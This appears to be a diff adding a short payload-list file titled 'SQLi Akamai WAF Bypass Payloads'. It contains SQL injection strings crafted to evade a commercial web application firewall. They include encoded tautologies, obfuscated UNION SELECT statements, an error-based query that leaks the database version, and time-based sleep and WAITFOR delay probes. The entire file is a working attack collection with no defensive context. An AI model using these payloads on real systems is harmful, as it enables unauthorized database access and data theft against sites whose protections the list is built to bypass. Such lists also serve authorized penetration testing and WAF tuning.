@@ -1,0 +1,14 @@
+# SQLi Akamai WAF Bypass Payloads
+' OR 1=1 OR ''='
+'+OR+1=1+OR+''='
+'%20OR%201=1%20OR%20''='
+'/**/OR/**/1=1/**/OR/**/''='
+1'%20||%201%23
+' uni%6Fn sel%65ct 1,2,3--
+' UNION%0A%0DSELECT%0A%0D1,2,3--
+'%2B(select+1+and+row(1,1)>(select+count(*),concat(version(),0x3A,floor(rand(0)*2))x+from+(select+1+union+select+2)a+group+by+x+limit+1))
+'%20and%20(select+1)=(Select+0xAA[.LEN.]+)/*
+'%20or%20sleep(5)%23
+'%20||%20pg_sleep(5)--
+'%20WAITFOR%20DELAY%20'0:0:5'--
+%27%0bOR%0b1=1--
